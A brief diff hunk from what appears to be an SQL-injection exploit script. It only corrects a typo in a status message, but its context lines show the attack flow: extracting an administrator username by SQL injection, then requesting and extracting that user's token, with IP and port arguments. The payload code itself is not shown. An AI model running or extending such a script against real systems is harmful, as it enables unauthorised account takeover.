@@ -110,7 +110,7 @@ if __name__ == '__main__':
     password = args.password
     ip = args.ip
     port = args.port
-    print("[+] Extrcting administrator Username via SQL Injection...")
+    print("[+] Extracting administrator Username via SQL Injection...")
     username = inject(10, target, 'username')
     request_token(target, username)
     print("[+] Extracting token for "+username+" via SQL Injection...")
